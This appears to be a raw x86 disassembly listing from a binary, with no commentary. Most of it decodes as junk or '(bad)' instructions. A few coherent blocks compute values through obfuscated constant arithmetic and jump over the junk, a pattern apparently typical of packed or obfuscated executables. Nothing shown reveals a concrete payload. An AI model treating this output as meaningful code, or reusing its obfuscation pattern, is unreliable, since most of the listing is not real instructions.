  41f3ae:	add    DWORD PTR [ecx],ecx
  41f3b0:	mov    esp,0xc66ee7bc
  41f3b5:	pop    edx
  41f3b6:	test   BYTE PTR [esi],bh
  41f3b8:	mov    cl,0x22
  41f3ba:	getsec 
  41f3bc:	ins    DWORD PTR es:[edi],dx
  41f3bd:	loope  0x41f350
  41f3bf:	add    ebp,DWORD PTR [eax]
  41f3c1:	add    ebp,DWORD PTR [edi-0x70]
  41f3c4:	bound  eax,QWORD PTR [ecx]
  41f3c6:	mov    al,ds:0x7d1c3d4b
  41f3cb:	test   eax,0x918fa57a
  41f3d0:	xor    al,0x40
  41f3d2:	sbb    al,0x84
  41f3d4:	(bad)  
  41f3d5:	jns    0x41f3d9
  41f3d7:	retf   
  41f3d8:	fldenv [ebp-0x44]
  41f3db:	cwde   
  41f3dc:	or     esi,ecx
  41f3de:	cs mov bl,0x20
  41f3e1:	fcomp  DWORD PTR ds:0x59e023c4
  41f3e7:	jne    0x41f41c
  41f3e9:	push   cs
  41f3ea:	mov    es,WORD PTR [esi]
  41f3ec:	mov    ah,al
  41f3ee:	clc    
  41f3ef:	cmp    eax,esp
  41f3f1:	pop    edx
  41f3f2:	ficom  DWORD PTR [ebp+0x60]
  41f3f5:	call   0x77:0xd07a6f2e
  41f3fc:	inc    esp
  41f3fd:	xchg   DWORD PTR ds:0xf073676c,edx
  41f403:	jp     0x41f433
  41f405:	dec    esi
  41f406:	fidiv  WORD PTR [ecx+ebp*2]
  41f409:	out    0x1c,al
  41f40b:	adc    edx,DWORD PTR [ebx]
  41f40d:	pop    es
  41f40e:	cli    
  41f40f:	push   ecx
  41f410:	dec    esi
  41f411:	adc    ecx,DWORD PTR [eax-0x26]
  41f414:	dec    ebp
  41f415:	push   ss
  41f416:	cmovnp eax,ecx
  41f419:	leave  
  41f41a:	push   eax
  41f41b:	push   es
  41f41c:	aas    
  41f41d:	push   edx
  41f41e:	push   es
  41f41f:	lea    eax,[edi+0x600eac1]
  41f425:	add    cl,BYTE PTR [edi]
  41f427:	jg     0x41f475
  41f429:	out    dx,eax
  41f42a:	ins    BYTE PTR es:[edi],dx
  41f42b:	and    al,0xf4
  41f42d:	loop   0x41f418
  41f42f:	fistp  DWORD PTR ds:[ebx]
  41f432:	mov    ebp,0x27333f83
  41f437:	rcr    BYTE PTR [edi+0x53],0x63
  41f43b:	mov    dh,0x31
  41f43d:	stos   DWORD PTR es:[edi],eax
  41f43e:	sub    eax,0x7d7de041
  41f443:	in     al,0x3d
  41f445:	xchg   ebx,eax
  41f446:	rcl    DWORD PTR [edi+ecx*1+0xa],0x8b
  41f44b:	mov    ds:0xd6697630,eax
  41f450:	add    eax,0x26650db7
  41f455:	cmp    ebx,ecx
  41f457:	or     bh,cl
  41f459:	mov    ch,0xca
  41f45b:	cs call 0x2c27:0xd1886f4f
  41f463:	imul   eax,DWORD PTR [ebx+eax*1-0x24c13128],0xffffff9f
  41f46b:	push   ebp
  41f46c:	push   esi
  41f46d:	loopne 0x41f412
  41f46f:	xchg   ebx,eax
  41f470:	lock cmp eax,0x65e2ca7f
  41f476:	push   ds
  41f477:	mov    BYTE PTR [ebx],bl
  41f479:	sub    eax,0xf2cae08b
  41f47e:	jl     0x41f4b7
  41f480:	inc    edx
  41f481:	js     0x41f426
  41f483:	xchg   edi,eax
  41f484:	stos   BYTE PTR es:[edi],al
  41f485:	scas   eax,DWORD PTR es:[edi]
  41f486:	and    eax,0xf07e917e
  41f48b:	jns    0x41f480
  41f48d:	fisubr DWORD PTR [ebp-0x499c65d9]
  41f493:	js     0x41f50a
  41f495:	mov    dh,0x33
  41f497:	adc    DWORD PTR [ecx+edi*4],ebp
  41f49a:	pop    ss
  41f49b:	xchg   ebp,eax
  41f49c:	dec    ebx
  41f49d:	xchg   esp,eax
  41f49e:	mov    eax,0x86aea281
  41f4a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f4a4:	div    BYTE PTR [esi+0x74db5dde]
  41f4aa:	lock int 0x36
  41f4ad:	rcr    DWORD PTR [eax],cl
  41f4af:	(bad)  
  41f4b0:	repz sbb bh,ch
  41f4b3:	and    eax,0x336253fa
  41f4b8:	adc    DWORD PTR [ecx+0x4588ee13],0x46
  41f4bf:	jno    0x41f507
  41f4c1:	std    
  41f4c2:	xchg   esi,eax
  41f4c3:	mov    al,0x88
  41f4c5:	ins    BYTE PTR es:[edi],dx
  41f4c6:	ret    
  41f4c7:	cmc    
  41f4c8:	gs inc edi
  41f4ca:	jl     0x41f4c4
  41f4cc:	out    0xa4,eax
  41f4ce:	retf   
  41f4cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f4d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f4d1:	mov    ecx,0x66a7c874
  41f4d6:	pop    ss
  41f4d7:	push   edi
  41f4d8:	in     al,dx
  41f4d9:	std    
  41f4da:	mov    eax,0xfe250893
  41f4df:	and    BYTE PTR [edx+0x77a00e48],dh
  41f4e5:	stos   BYTE PTR es:[edi],al
  41f4e6:	pop    edi
  41f4e7:	arpl   WORD PTR [edi],bp
  41f4e9:	and    DWORD PTR [esi+0x4b],ebx
  41f4ec:	jmp    FWORD PTR cs:[esp+edx*8+0xbb04da3]
  41f4f4:	cmp    DWORD PTR [edx],edx
  41f4f6:	cmp    BYTE PTR [ecx],dl
  41f4f8:	ret    0x8dd
  41f4fb:	xlat   BYTE PTR ds:[ebx]
  41f4fc:	adc    al,0x1a
  41f4fe:	aam    0x63
  41f500:	or     ebp,DWORD PTR [edi]
  41f502:	(bad)  
  41f503:	cmp    eax,0xe226756f
  41f508:	popa   
  41f509:	sbb    BYTE PTR [ecx+0x3b],0xf7
  41f50d:	loope  0x41f525
  41f50f:	or     esp,DWORD PTR [ebx-0x13]
  41f512:	push   esi
  41f513:	mov    cl,0x52
  41f515:	mov    esi,0x2eb23dc5
  41f51a:	fs test eax,0xff428e65
  41f520:	cld    
  41f521:	xchg   esp,eax
  41f522:	cld    
  41f523:	adc    DWORD PTR [edi-0x584a7ddc],ebp
  41f529:	lds    edx,FWORD PTR [edi]
  41f52b:	test   BYTE PTR [ebp+eax*4-0x2e3faa37],dh
  41f532:	jl     0x41f56f
  41f534:	iret   
  41f535:	adc    eax,ebx
  41f537:	out    dx,al
  41f538:	nop
  41f539:	xchg   ebp,eax
  41f53a:	inc    eax
  41f53b:	inc    edi
  41f53c:	lods   eax,DWORD PTR ds:[esi]
  41f53d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f53e:	push   ds
  41f53f:	jge    0x41f587
  41f541:	cmc    
  41f542:	test   eax,0xcd2d4d59
  41f547:	ds jmp 0xb5b0:0xa02bb9b0
  41f54f:	int3   
  41f550:	cdq    
  41f551:	stos   DWORD PTR es:[edi],eax
  41f552:	loop   0x41f52f
  41f554:	pop    es
  41f555:	loop   0x41f512
  41f557:	test   DWORD PTR [edx+0x68827a49],esi
  41f55d:	addr16 mov ebx,0xe1e3736
  41f563:	mov    ecx,0x8cd5558f
  41f568:	int3   
  41f569:	sti    
  41f56a:	xchg   edi,eax
  41f56b:	push   ebx
  41f56c:	mov    edi,0x3b1205c1
  41f571:	and    DWORD PTR [eax],ebx
  41f573:	ficom  DWORD PTR [eax-0x6a9bcec5]
  41f579:	or     al,0xe1
  41f57b:	imul   ebx,DWORD PTR [eax+esi*4],0x8
  41f57f:	sub    al,BYTE PTR [edx-0xcadbf76]
  41f585:	adc    BYTE PTR [edx+0x2e],bh
  41f588:	fwait
  41f589:	(bad)  
  41f58a:	icebp  
  41f58b:	inc    ebx
  41f58c:	adc    DWORD PTR ds:0xd358bff5,edx
  41f592:	adc    eax,0x248d8bfd
  41f597:	(bad)  
  41f598:	(bad)  
  41f599:	jmp    DWORD PTR [ebx]
  41f59b:	rol    DWORD PTR [ebx],0x45
  41f59e:	mov    esp,0xff208d8b
  41f5a3:	(bad)  
  41f5a4:	dec    DWORD PTR [ebp+0x272f0884]
  41f5aa:	add    BYTE PTR [eax],al
  41f5ac:	xor    eax,0x1080c
  41f5b1:	add    eax,DWORD PTR [ebp-0x178]
  41f5b7:	mov    DWORD PTR [ebp-0xe8],eax
  41f5bd:	mov    DWORD PTR [ebp-0xc],0x5950
  41f5c4:	mov    DWORD PTR [ebp-0xf8],0x4964
  41f5ce:	mov    DWORD PTR [ebp-0x130],0x3
  41f5d8:	mov    DWORD PTR [ebp-0x20],0x2df9
  41f5df:	mov    DWORD PTR [ebp-0x8],0x4524
  41f5e6:	mov    DWORD PTR [ebp-0xd4],0x637e
  41f5f0:	mov    DWORD PTR [ebp-0x110],0x38c8
  41f5fa:	mov    DWORD PTR [ebp-0xa4],0x7118
  41f604:	mov    DWORD PTR [ebp-0xa0],0xaf6
  41f60e:	mov    DWORD PTR [ebp-0x10c],0x3315
  41f618:	mov    eax,DWORD PTR [ebp-0xf8]
  41f61e:	mov    ecx,DWORD PTR [ebp-0x130]
  41f624:	xor    edx,edx
  41f626:	div    ecx
  41f628:	add    eax,0x454e
  41f62d:	mov    ecx,DWORD PTR [ebp-0xc]
  41f630:	and    eax,ecx
  41f632:	xor    eax,0x5940
  41f637:	add    eax,DWORD PTR [ebp+0x8]
  41f63a:	mov    ecx,DWORD PTR [ebp-0x110]
  41f640:	mov    edx,DWORD PTR [ebp-0xa4]
  41f646:	sub    ecx,edx
  41f648:	mov    edx,DWORD PTR [ebp-0xd4]
  41f64e:	or     ecx,edx
  41f650:	mov    edx,DWORD PTR [ebp-0x8]
  41f653:	and    ecx,edx
  41f655:	jmp    0x41fa3c
  41f65a:	cmp    DWORD PTR [ebx-0x6397a419],esi
  41f660:	mov    edx,0x50f9fab3
  41f665:	sahf   
  41f666:	retf   
  41f667:	push   es
  41f668:	cmp    dl,BYTE PTR [edx-0x413f7ab4]
  41f66e:	dec    edx
  41f66f:	les    edi,FWORD PTR [esi-0x4927df42]
  41f675:	fdivr  st(6),st
  41f677:	xor    ebp,DWORD PTR [eax]
  41f679:	add    edi,DWORD PTR ds:0x99408c33
  41f67f:	enter  0xadb7,0xe1
  41f683:	outs   dx,DWORD PTR ds:[esi]
  41f684:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f685:	push   ebx
  41f686:	xor    BYTE PTR [esi],dh
  41f688:	cmp    BYTE PTR ds:0x77e4084d,bh
  41f68e:	xchg   edi,eax
  41f68f:	xchg   esp,eax
  41f690:	pop    ebp
  41f691:	aam    0xca
  41f693:	mov    DWORD PTR [esi-0x30],eax
  41f696:	adc    al,0x43
  41f698:	icebp  
  41f699:	push   esi
  41f69a:	sub    dh,BYTE PTR [edi+0x6c]
  41f69d:	test   BYTE PTR [esi+0x40],ch
  41f6a0:	pop    eax
  41f6a1:	iret   
  41f6a2:	in     al,0xa3
  41f6a4:	push   0x1c
  41f6a6:	out    0xd,eax
  41f6a8:	fdiv   st,st(3)
  41f6aa:	imul   esp,DWORD PTR [edi],0xac03c9bc
  41f6b0:	cmp    DWORD PTR [edx],edx
  41f6b2:	pushf  
  41f6b3:	scas   al,BYTE PTR es:[edi]
  41f6b4:	and    al,0x1a
  41f6b6:	push   edi
  41f6b7:	jecxz  0x41f64f
  41f6b9:	pop    esp
  41f6ba:	lahf   
  41f6bb:	push   ds
  41f6bc:	ds mov ecx,0x8ae32092
  41f6c2:	xor    eax,0xb7a39bc7
  41f6c7:	int3   
  41f6c8:	jmp    0x3a0d0055
  41f6cd:	outs   dx,BYTE PTR ds:[esi]
  41f6ce:	mov    ecx,0xd848c734
  41f6d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f6d4:	dec    ebp
  41f6d5:	retf   0xe44c
  41f6d8:	and    cl,BYTE PTR [ebx+0x7]
  41f6db:	aad    0x70
  41f6dd:	test   DWORD PTR [edx-0x1f],ecx
  41f6e0:	or     eax,0xe65e9a7d
  41f6e5:	(bad)  
  41f6e6:	adc    eax,0x63a402eb
  41f6eb:	cs cld 
  41f6ed:	mov    DWORD PTR [bp+di],esp
  41f6f0:	push   edx
  41f6f1:	mov    ah,0x50
  41f6f3:	dec    eax
  41f6f4:	loop   0x41f6fd
  41f6f6:	mov    WORD PTR ds:0x6d09804,fs
  41f6fc:	sbb    eax,0x60
  41f6ff:	nop
  41f700:	add    eax,0x2df221ae
  41f705:	and    eax,0xcee82956
  41f70a:	mov    ds:0x73a3fc49,al
  41f70f:	add    al,0xea
  41f711:	in     eax,0x4
  41f713:	xchg   edx,eax
  41f714:	jmp    0x41f763
  41f716:	xchg   DWORD PTR [esi+0x7c04a146],ecx
  41f71c:	sub    BYTE PTR [eax+0x2607a302],ah
  41f722:	repnz dec ebx
  41f724:	or     DWORD PTR [eax-0x7c18c76b],0x35
  41f72b:	out    dx,al
  41f72c:	js     0x41f74e
  41f72e:	and    BYTE PTR ds:0x3dd750e4,dl
  41f734:	cs xchg edx,esi
  41f737:	(bad)  
  41f738:	(bad)  
  41f739:	pop    ebx
  41f73a:	and    dh,BYTE PTR [esi+0x6a754d93]
  41f740:	push   esi
  41f741:	mov    esp,DWORD PTR [esi+0x1d46ffb7]
  41f747:	add    eax,0x90c43aa9
  41f74c:	xor    dl,ch
  41f74e:	add    ebp,0xffffff99
  41f751:	jae    0x41f70c
  41f753:	jp     0x41f7a8
  41f755:	fwait
  41f756:	adc    BYTE PTR [edx],al
  41f758:	pop    ebx
  41f759:	outs   dx,BYTE PTR ds:[esi]
  41f75a:	cld    
  41f75b:	(bad)
  41f75f:	cmp    ch,dl
  41f761:	test   BYTE PTR ds:0x4c75ff85,0xa6
  41f768:	adc    eax,0xf84e2159
  41f76d:	mov    dl,0x15
  41f76f:	aas    
  41f770:	mov    bl,0x8d
  41f772:	cmp    al,0x47
  41f774:	xor    eax,0x5a0e570
  41f779:	mov    dh,BYTE PTR [ecx+eiz*1]
  41f77c:	xor    edi,edx
  41f77e:	dec    DWORD PTR ds:[esi+0x2c]
  41f782:	sbb    esp,DWORD PTR [edx]
  41f784:	shl    BYTE PTR [edi-0x61],cl
  41f787:	cmp    BYTE PTR ds:0xdd30a95,0x3b
  41f78e:	pop    edi
  41f78f:	cmc    
  41f790:	pop    es
  41f791:	jmp    0x4153511
  41f796:	fs adc eax,0xcab05838
  41f79c:	push   ds
  41f79d:	or     ecx,DWORD PTR [esi]
  41f79f:	(bad)  
  41f7a0:	ficom  WORD PTR [edx-0x595280fd]
  41f7a6:	inc    ecx
  41f7a7:	adc    dl,dh
  41f7a9:	pop    esp
  41f7aa:	jecxz  0x41f824
  41f7ac:	hlt    
  41f7ad:	mov    bh,0xbb
  41f7af:	lahf   
  41f7b0:	jge    0x41f7e6
  41f7b2:	lock loop 0x41f826
  41f7b5:	ja     0x41f740
  41f7b7:	loope  0x41f740
  41f7b9:	mov    edx,0x39208073
  41f7be:	pusha  
  41f7bf:	sahf   
  41f7c0:	sbb    eax,0xbc0d01bd
  41f7c5:	loope  0x41f7ba
  41f7c7:	sub    BYTE PTR fs:0x9638f607,bh
  41f7ce:	loope  0x41f819
  41f7d0:	push   es
  41f7d1:	sbb    eax,0x5b60604b
  41f7d6:	pop    ds
  41f7d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f7d8:	sbb    BYTE PTR [edx],dl
  41f7da:	test   BYTE PTR [esp+ebx*4-0x5bb6627b],0xe7
  41f7e2:	sbb    esi,edi
  41f7e4:	or     eax,0x4ca41902
  41f7e9:	inc    esp
  41f7ea:	jb     0x41f7e7
  41f7ec:	scas   eax,DWORD PTR es:[edi]
  41f7ed:	shr    BYTE PTR [ecx+0x45dfb6b7],cl
  41f7f3:	dec    ecx
  41f7f4:	push   ds
  41f7f5:	jae    0x41f813
  41f7f7:	test   eax,0x23129b4
  41f7fc:	les    edi,FWORD PTR [esi]
  41f7fe:	jne    0x41f848
  41f800:	jecxz  0x41f832
  41f802:	ret    
  41f803:	bound  ebx,QWORD PTR [ecx]
  41f805:	fmul   QWORD PTR [edx-0x20]
  41f808:	sbb    eax,0xbbbd806a
  41f80d:	gs pop eax
  41f80f:	inc    edi
  41f810:	sbb    al,0x57
  41f812:	sub    ebp,DWORD PTR [ebx]
  41f814:	cmp    al,0x2b
  41f816:	sub    esp,0x5a
  41f819:	enter  0x8df6,0xa4
  41f81d:	(bad)  
  41f81e:	adc    bl,dh
  41f820:	push   ebp
  41f821:	pop    ebx
  41f822:	xor    al,0x57
  41f824:	adc    ecx,DWORD PTR [ebp+0x72b17ebd]
  41f82a:	add    al,BYTE PTR [ecx]
  41f82c:	adc    eax,0x1c94cce
  41f831:	sub    DWORD PTR [ecx+0x17],ecx
  41f834:	mov    ch,0x26
  41f836:	ret    0x4bea
  41f839:	inc    edx
  41f83a:	test   al,0xf1
  41f83c:	add    ah,al
  41f83e:	test   eax,0x277a454d
  41f843:	outs   dx,BYTE PTR ds:[esi]
  41f844:	sbb    esp,DWORD PTR [esi]
  41f846:	mov    sp,0x36b7
  41f84a:	pop    es
  41f84b:	xor    BYTE PTR [ebp-0x6e],dl
  41f84e:	cwde   
  41f84f:	add    eax,0x163c989d
  41f854:	xor    DWORD PTR [edx-0x38],esi
  41f857:	out    0xa2,eax
  41f859:	sti    
  41f85a:	(bad)
  41f85d:	rcr    BYTE PTR [eax],cl
  41f85f:	stos   DWORD PTR es:[edi],eax
  41f860:	cmp    esp,0x323bf404
  41f866:	push   ebp
  41f867:	in     al,0xbb
  41f869:	(bad)  
  41f86a:	xlat   BYTE PTR ds:[ebx]
  41f86c:	cmp    eax,0x909bcd2d
  41f871:	lods   eax,DWORD PTR ds:[esi]
  41f872:	cmp    DWORD PTR [esi-0x580b3282],edi
  41f878:	aam    0xc7
  41f87a:	and    ebx,edi
  41f87c:	cwde   
  41f87d:	xchg   ebx,eax
  41f87e:	hlt    
  41f87f:	push   ecx
  41f880:	push   es
  41f881:	popf   
  41f882:	or     esp,edx
  41f884:	xor    eax,0x568cc384
  41f889:	mov    ds:0x7d79fd7c,eax
  41f88e:	mov    edx,DWORD PTR [esi+ecx*1+0x47]
  41f892:	shl    ecx,0xe2
  41f895:	enter  0xc0a0,0x6
  41f899:	in     al,0xc8
  41f89b:	pushf  
  41f89c:	mov    ebx,0xb88731a9
  41f8a1:	les    esi,FWORD PTR [edx-0x6a]
  41f8a4:	inc    edx
  41f8a5:	std    
  41f8a6:	cmc    
  41f8a7:	xor    BYTE PTR [eax-0x6596c73e],dh
  41f8ad:	hlt    
  41f8ae:	repz in eax,dx
  41f8b0:	cwde   
  41f8b1:	sub    esi,ebx
  41f8b3:	xchg   ebp,eax
  41f8b4:	or     eax,0x7c55d916
  41f8b9:	or     BYTE PTR [ebx],0x5f
  41f8bc:	ins    BYTE PTR es:[edi],dx
  41f8bd:	cmp    DWORD PTR ds:[esi],edx
  41f8c0:	clc    
  41f8c1:	out    0xd9,al
  41f8c3:	mov    ds:0xcdcc39d0,eax
  41f8c8:	jecxz  0x41f924
  41f8ca:	adc    al,0x9b
  41f8cc:	les    esi,FWORD PTR [edx]
  41f8ce:	jno    0x41f8bb
  41f8d0:	mov    al,ds:0x62dc8dce
  41f8d5:	add    ecx,ebp
  41f8d7:	fisubr WORD PTR [edi+edi*2-0x1f]
  41f8db:	es sar cl,cl
  41f8de:	jmp    0x41f879
  41f8e0:	popf   
  41f8e1:	inc    ecx
  41f8e2:	jmp    0x41f8ba
  41f8e4:	enter  0xad96,0xa7
  41f8e8:	xchg   edx,eax
  41f8e9:	xchg   ebx,eax
  41f8ea:	push   cs
  41f8eb:	push   cs
  41f8ec:	add    DWORD PTR [ebp+0x28],0xec15e000
  41f8f3:	xchg   ebx,eax
  41f8f4:	xchg   ebx,eax
  41f8f5:	sbb    dl,BYTE PTR [ecx]
  41f8f7:	retf   
  41f8f8:	mov    DWORD PTR [ebx],ebp
  41f8fa:	int    0xb4
  41f8fc:	cmp    ecx,0xcc0a6132
  41f902:	loopne 0x41f979
  41f904:	mov    cl,BYTE PTR ds:0x427e9c5
  41f90a:	xchg   esp,eax
  41f90b:	adc    ch,BYTE PTR [ebp-0x3d]
  41f90e:	data16 or BYTE PTR [ebx],al
  41f911:	stos   BYTE PTR es:[edi],al
  41f912:	fdiv   st,st(4)
  41f914:	shr    ebx,0xe5
  41f917:	add    eax,0x8fb1bdf
  41f91c:	mov    al,0x69
  41f91e:	mov    al,ds:0x18fef8d6
  41f923:	mov    ecx,0xa903fb2b
  41f928:	into   
  41f929:	das    
  41f92a:	lods   eax,DWORD PTR ds:[esi]
  41f92b:	inc    edi
  41f92c:	or     edx,DWORD PTR [edx]
  41f92e:	mov    BYTE PTR [edi+0x73cf2a66],0xdc
  41f935:	xor    esp,DWORD PTR [edx+edx*8]
  41f938:	imul   esi,DWORD PTR [esi+0x34c9e942],0xffffffab
  41f93f:	shl    BYTE PTR [ebx-0x1c8f0359],cl
  41f945:	jae    0x41f95f
  41f947:	rol    BYTE PTR ds:0x5c227b22,cl
  41f94d:	and    dl,BYTE PTR [ebx+0x79]
  41f950:	mov    bl,0xd0
  41f952:	shr    BYTE PTR [edi],0xb6
  41f955:	inc    edx
  41f956:	in     al,0xa1
  41f958:	lds    ebx,FWORD PTR [edi+0x3f]
  41f95b:	stos   DWORD PTR es:[edi],eax
  41f95c:	mov    ch,0xc3
  41f95e:	cmp    bl,BYTE PTR [ebx+0xe923e1b]
  41f964:	stc    
  41f965:	mov    dh,0x26
  41f967:	sbb    al,0xbd
  41f969:	popa   
  41f96a:	mov    dl,0xd7
  41f96c:	pop    edx
  41f96d:	pushf  
  41f96e:	pop    ecx
  41f96f:	daa    
  41f970:	fcom   QWORD PTR [edx-0x58877856]
  41f976:	std    
  41f977:	push   DWORD PTR [ecx-0xaca124c]
  41f97d:	xor    esi,edi
  41f97f:	sbb    ecx,DWORD PTR [eax+ebp*4-0x7b365d5f]
  41f986:	(bad)
  41f989:	jmp    FWORD PTR [ebx]
  41f98b:	and    eax,0x1a0d3e39
  41f990:	dec    edi
  41f991:	mov    eax,0x23b24ba1
  41f996:	stos   DWORD PTR es:[edi],eax
  41f997:	aam    0xb
  41f999:	cmc    
  41f99a:	retf   
  41f99b:	add    al,0x5b
  41f99d:	jmp    0x2398d2e8
  41f9a2:	mov    ah,0x9
  41f9a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f9a5:	mov    dh,0x41
  41f9a7:	dec    esp
  41f9a8:	repnz inc edi
  41f9aa:	retf   
  41f9ab:	dec    ebp
  41f9ac:	lods   eax,DWORD PTR ds:[esi]
  41f9ad:	lahf   
  41f9ae:	repnz rol DWORD PTR [eax+0x50431cf9],cl
  41f9b5:	push   esi
  41f9b6:	push   edi
  41f9b7:	pop    ecx
  41f9b8:	fs ja  0x41f9b2
  41f9bb:	inc    ecx
  41f9bc:	fabs   
  41f9be:	adc    ebx,0x3f
  41f9c1:	rcr    esp,1
  41f9c3:	xchg   ecx,eax
  41f9c4:	fxch   st(6)
  41f9c6:	in     al,0xfe
  41f9c8:	pushf  
  41f9c9:	add    BYTE PTR [ebx+0x4b],dh
  41f9cc:	add    BYTE PTR [edi+0x53],dl
  41f9cf:	loopne 0x41f95b
  41f9d1:	(bad)  
  41f9d2:	stos   BYTE PTR es:[edi],al
  41f9d3:	add    eax,ebx
  41f9d5:	inc    ebp
  41f9d6:	ins    BYTE PTR es:[edi],dx
  41f9d7:	add    esp,esp
  41f9d9:	iret   
  41f9da:	xchg   ebp,eax
  41f9db:	dec    ecx
  41f9dc:	jmp    0x3e1ed268
  41f9e1:	pop    ecx
  41f9e2:	add    edi,DWORD PTR [esi-0x4f2d2e1a]
  41f9e8:	(bad)  
  41f9ea:	push   0xffffff86
  41f9ec:	ds hlt 
  41f9ee:	or     ebx,DWORD PTR [ecx+0x32]
  41f9f1:	in     eax,0xaf
  41f9f3:	icebp  
  41f9f4:	pop    eax
  41f9f5:	fwait
  41f9f6:	or     DWORD PTR [ecx+0x5a],0x53
  41f9fa:	dec    eax
  41f9fb:	sbb    eax,0x566550cc
  41fa00:	xchg   DWORD PTR fs:[eax],ebp
  41fa03:	cmc    
  41fa04:	mov    al,0xe4
  41fa06:	cli    
  41fa07:	cmp    al,0x12
  41fa09:	mov    WORD PTR [ecx+edi*1],gs
  41fa0c:	mov    fs,eax
  41fa0e:	cmp    ecx,eax
  41fa10:	jp     0x41fa47
  41fa12:	pop    edi
  41fa13:	cli    
  41fa14:	sub    al,0x9a
  41fa16:	push   esp
  41fa17:	test   BYTE PTR [edx+0x29],ch
  41fa1a:	jmp    0x6d379022
  41fa1f:	pusha  
  41fa20:	shr    BYTE PTR [ecx],1
  41fa22:	cwde   
  41fa23:	imul   edi,DWORD PTR [esi],0xfee9e5d2
  41fa29:	stos   DWORD PTR es:[edi],eax
  41fa2a:	fwait
  41fa2b:	or     al,0x92
  41fa2d:	adc    edi,edx
  41fa2f:	add    BYTE PTR [eax+0x4c7bc167],cl
  41fa35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa36:	xchg   DWORD PTR [ebp-0x2d977e11],edi
  41fa3c:	mov    edx,DWORD PTR [ebp-0x20]
  41fa3f:	xor    ecx,edx
  41fa41:	mov    edx,DWORD PTR [ebp-0x10c]
  41fa47:	mov    esi,0x180f
  41fa4c:	sub    esi,edx
  41fa4e:	mov    edx,DWORD PTR [ebp-0xa0]
  41fa54:	imul   esi,edx
  41fa57:	xor    esi,0x402b
  41fa5d:	xor    esi,0xfed78c17
  41fa63:	mov    edx,DWORD PTR [ebp-0xe8]
  41fa69:	mov    ecx,DWORD PTR [edx+ecx*1-0x68bd]
  41fa70:	add    ecx,eax
  41fa72:	add    esi,ecx
  41fa74:	mov    DWORD PTR [ebp-0x38],esi
  41fa77:	mov    DWORD PTR [ebp-0x4],0x59a8
  41fa7e:	mov    DWORD PTR [ebp-0x30],0x7021
  41fa85:	mov    DWORD PTR [ebp-0xf4],0x6210
  41fa8f:	mov    DWORD PTR [ebp-0x58],0x73d5
  41fa96:	mov    DWORD PTR [ebp-0x124],0x1e7d
  41faa0:	mov    DWORD PTR [ebp-0x3c],0x3144
  41faa7:	mov    eax,DWORD PTR [ebp-0x30]
  41faaa:	xor    eax,0x75cb
  41faaf:	mov    ecx,DWORD PTR [ebp-0x4]
  41fab2:	imul   eax,ecx
  41fab5:	mov    ecx,DWORD PTR [ebp+0x8]
  41fab8:	lea    ecx,[ecx+eax*1-0x2123b90]
  41fabf:	mov    eax,DWORD PTR [ebp-0xf4]
  41fac5:	and    eax,0x6b34
  41faca:	and    eax,0x658d
  41facf:	xor    edx,edx
  41fad1:	push   0x6
  41fad3:	pop    esi
  41fad4:	div    esi
  41fad6:	imul   eax,eax,0x3fb9
  41fadc:	mov    edx,DWORD PTR [ebp-0x3c]
  41fadf:	and    edx,0x58c7
  41fae5:	mov    esi,DWORD PTR [ebp-0x124]
  41faeb:	or     edx,esi
  41faed:	add    edx,0x7a25
  41faf3:	imul   edx,edx,0x28d2
  41faf9:	mov    esi,DWORD PTR [ebp-0x58]
  41fafc:	xor    edx,esi
  41fafe:	xor    edx,0x1856f731
  41fb04:	mov    esi,DWORD PTR [ebp-0xe8]
  41fb0a:	mov    eax,DWORD PTR [esi+eax*1-0x3fb8fdc]
  41fb11:	add    eax,ecx
  41fb13:	add    edx,eax
  41fb15:	mov    DWORD PTR [ebp-0xac],edx
  41fb1b:	mov    DWORD PTR [ebp-0x54],0x1
  41fb22:	mov    DWORD PTR [ebp-0x40],0x1ee8
  41fb29:	mov    DWORD PTR [ebp-0x1c],0x64d8
  41fb30:	mov    DWORD PTR [ebp-0xf0],0x5a06
  41fb3a:	mov    DWORD PTR [ebp-0x108],0x2eeb
  41fb44:	mov    DWORD PTR [ebp-0x104],0x2108
  41fb4e:	mov    eax,DWORD PTR [ebp-0x1c]
  41fb51:	jmp    0x41ff38
  41fb56:	cwde   
  41fb57:	push   ebx
  41fb58:	popa   
  41fb59:	pop    edx
  41fb5a:	stos   BYTE PTR es:[edi],al
  41fb5b:	jl     0x41fb15
  41fb5d:	xchg   ebx,eax
  41fb5e:	mov    dl,0x3a
  41fb60:	repnz iret 
  41fb62:	add    eax,DWORD PTR [eax]
  41fb64:	fst    QWORD PTR [eax-0x413f7229]
  41fb6a:	dec    edx
  41fb6b:	les    edi,FWORD PTR [esi+0x45f3ffbe]
  41fb71:	les    esp,FWORD PTR [ebp-0x6a]
  41fb74:	nop
  41fb75:	and    al,0x43
  41fb77:	iret   
  41fb78:	xor    DWORD PTR [edi-0x62],0xaa60d907
  41fb7f:	cwde   
  41fb80:	jecxz  0x41fb42
  41fb82:	pop    edx
  41fb83:	fwait
  41fb84:	or     DWORD PTR [ecx],0xee00822
  41fb8a:	ret    0x8bd1
  41fb8d:	mov    ds:0xe1238aeb,eax
  41fb92:	jnp    0x41fb96
  41fb94:	push   esi
  41fb95:	ret    0x7350
  41fb98:	mov    gs,WORD PTR [ebp-0x659f6707]
  41fb9e:	adc    eax,0xfb879f00
  41fba3:	jbe    0x41fc0c
  41fba5:	adc    ah,BYTE PTR [edi+edx*8]
  41fba8:	dec    eax
  41fba9:	cwde   
  41fbaa:	fisttp WORD PTR [ebx-0x30]
  41fbad:	pop    ebx
  41fbae:	repnz xchg ebp,eax
  41fbb0:	mov    edx,0x59d81348
  41fbb5:	ret    
  41fbb6:	ja     0x41fbad
  41fbb8:	push   ds
  41fbb9:	inc    esp
  41fbba:	int3   
  41fbbb:	pop    ebp
  41fbbc:	icebp  
  41fbbd:	out    dx,eax
  41fbbe:	mov    cl,0x46
  41fbc0:	mov    ecx,0x884eb3b6
  41fbc5:	push   edi
  41fbc6:	in     eax,dx
  41fbc7:	not    ebp
  41fbc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
